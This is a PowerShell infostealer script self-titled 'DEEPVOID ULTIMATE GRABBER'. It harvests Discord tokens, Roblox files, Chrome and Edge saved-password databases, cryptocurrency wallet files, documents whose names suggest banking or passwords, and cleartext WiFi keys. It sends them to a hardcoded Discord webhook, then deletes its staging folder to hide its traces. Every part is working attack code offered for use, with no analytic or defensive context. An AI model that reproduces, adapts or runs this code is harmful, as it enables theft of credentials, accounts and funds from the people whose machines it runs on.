# PASTE YOUR WEBHOOK URL HERE:
$webhook = "https://discord.com/api/webhooks/1441864064434176192/HKZGyQZ-PRIQ8v_t_HWqr1TiR10UeTNfn3W4UFuNgGkZipUyQxnicHrhwiKkRR3MQDz0"

# Create main folder with PC name
$pcName = $env:COMPUTERNAME
$mainFolder = "$env:TEMP\$pcName"
New-Item -ItemType Directory -Path $mainFolder -Force | Out-Null

# Function to send to Discord
function Send-ToDiscord {
    param($content)
    try {
        $payload = @{content = $content}
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch { }
}

# 1. STEAL DISCORD TOKENS
$discordFolder = "$mainFolder\Discord"
New-Item -ItemType Directory -Path $discordFolder -Force | Out-Null
$discordTokens = @()

$discordPaths = @("$env:APPDATA\Discord", "$env:APPDATA\discordptb", "$env:APPDATA\discordcanary")
foreach ($path in $discordPaths) {
    if (Test-Path "$path\Local Storage\leveldb") {
        Get-ChildItem "$path\Local Storage\leveldb" -Filter *.ldb -ErrorAction SilentlyContinue | ForEach-Object {
            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') {
                $discordTokens += $matches[0]
                $matches[0] | Out-File "$discordFolder\tokens.txt" -Append
            }
        }
    }
}

# 2. STEAL ROBLOX DATA
$robloxFolder = "$mainFolder\Roblox" 
New-Item -ItemType Directory -Path $robloxFolder -Force | Out-Null
$robloxData = @()

$robloxPaths = @("$env:LOCALAPPDATA\Roblox", "$env:APPDATA\Roblox")
foreach ($path in $robloxPaths) {
    if (Test-Path $path) {
        Get-ChildItem $path -Recurse -Include *.xml,*.json,*.txt,*.dat -ErrorAction SilentlyContinue | ForEach-Object {
            $robloxData += $_.Name
            Copy-Item $_.FullName -Destination "$robloxFolder\$($_.Name)" -ErrorAction SilentlyContinue
        }
    }
}

# 3. STEAL BROWSER PASSWORDS
$browserFolder = "$mainFolder\Browsers"
New-Item -ItemType Directory -Path $browserFolder -Force | Out-Null
$browserData = @()

$browsers = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
)

foreach ($browser in $browsers) {
    if (Test-Path $browser) {
        $browserName = $browser.Split('\')[-3]
        $browserData += "$browserName FOUND"
        
        # Copy password files
        if (Test-Path "$browser\Login Data") {
            Copy-Item "$browser\Login Data" -Destination "$browserFolder\$browserName_Login_Data" -ErrorAction SilentlyContinue
        }
    }
}

# 4. STEAL CRYPTO WALLETS
$cryptoFolder = "$mainFolder\Crypto"
New-Item -ItemType Directory -Path $cryptoFolder -Force | Out-Null
$cryptoWallets = @()

$walletPaths = @("$env:APPDATA\MetaMask", "$env:APPDATA\Exodus", "$env:APPDATA\Electrum")
foreach ($walletPath in $walletPaths) {
    if (Test-Path $walletPath) {
        Get-ChildItem $walletPath -Recurse -Include *.json,*.dat,*.log -ErrorAction SilentlyContinue | ForEach-Object {
            $cryptoWallets += $_.Name
            Copy-Item $_.FullName -Destination "$cryptoFolder\$($_.Name)" -ErrorAction SilentlyContinue
        }
    }
}

# 5. STEAL SENSITIVE DOCUMENTS
$docsFolder = "$mainFolder\Documents"
New-Item -ItemType Directory -Path $docsFolder -Force | Out-Null
$sensitiveFiles = @()

$folders = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")
foreach ($folder in $folders) {
    if (Test-Path $folder) {
        Get-ChildItem $folder -Recurse -Include *.pdf,*.doc,*.docx,*.xls,*.xlsx,*.txt -ErrorAction SilentlyContinue | ForEach-Object {
            $fileName = $_.Name.ToLower()
            if ($fileName -match "bank|password|login|credit|tax|invoice|account|secret|confidential") {
                $sensitiveFiles += $_.Name
                Copy-Item $_.FullName -Destination "$docsFolder\$($_.Name)" -ErrorAction SilentlyContinue
            }
        }
    }
}

# 6. STEAL WIFI PASSWORDS
$wifiFolder = "$mainFolder\Wifi"
New-Item -ItemType Directory -Path $wifiFolder -Force | Out-Null
$wifiPasswords = @()

$profiles = netsh wlan show profiles | Select-String "All User Profile"
foreach ($profile in $profiles) {
    $name = $profile.ToString().Split(":")[1].Trim()
    $password = netsh wlan show profile name="$name" key=clear | Select-String "Key Content"
    if ($password) {
        $pass = $password.ToString().Split(":")[1].Trim()
        $wifiPasswords += "$name : $pass"
        "$name : $pass" | Out-File "$wifiFolder\passwords.txt" -Append
    }
}

# 7. SYSTEM INFO
$systemFolder = "$mainFolder\System"
New-Item -ItemType Directory -Path $systemFolder -Force | Out-Null

$systemInfo = "Computer: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $((Get-WmiObject Win32_OperatingSystem).Caption)`nDate: $(Get-Date)"
$systemInfo | Out-File "$systemFolder\info.txt"

# BUILD AND SEND MESSAGE
$message = "üî¥ **DEEPVOID ULTIMATE GRABBER - $pcName** üî¥`n`n"
$message += "**üì± DISCORD TOKENS:**`n"
if ($discordTokens.Count -gt 0) { $message += ($discordTokens -join "`n") } else { $message += "None found" }
$message += "`n`n**üéÆ ROBLOX FILES:**`n" 
if ($robloxData.Count -gt 0) { $message += ($robloxData -join "`n") } else { $message += "None found" }
$message += "`n`n**üåê BROWSERS:**`n"
if ($browserData.Count -gt 0) { $message += ($browserData -join "`n") } else { $message += "None found" }
$message += "`n`n**üí∞ CRYPTO WALLETS:**`n"
if ($cryptoWallets.Count -gt 0) { $message += ($cryptoWallets -join "`n") } else { $message += "None found" }
$message += "`n`n**üìÑ SENSITIVE FILES:**`n"
if ($sensitiveFiles.Count -gt 0) { $message += ($sensitiveFiles -join "`n") } else { $message += "None found" }
$message += "`n`n**üì∂ WIFI PASSWORDS:**`n"
if ($wifiPasswords.Count -gt 0) { $message += ($wifiPasswords -join "`n") } else { $message += "None found" }
$message += "`n`n**üíª SYSTEM INFO:**`n$systemInfo`n`n"
$message += "**üìÅ ALL DATA SAVED TO:**`n$mainFolder"

Send-ToDiscord $message

# Upload important files
if (Test-Path "$wifiFolder\passwords.txt") {
    $wifiContent = Get-Content "$wifiFolder\passwords.txt" -Raw
    Send-ToDiscord "**WIFI PASSWORDS:**`n```$wifiContent```"
}

if (Test-Path "$discordFolder\tokens.txt") {
    $tokenContent = Get-Content "$discordFolder\tokens.txt" -Raw  
    Send-ToDiscord "**DISCORD TOKENS:**`n```$tokenContent```"
}

# Cleanup after 2 minutes
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 120
    Remove-Item $using:mainFolder -Recurse -Force -ErrorAction SilentlyContinue
} | Out-Null

Send-ToDiscord "‚úÖ **GRABBER EXECUTION COMPLETE - $pcName** ‚úÖ"
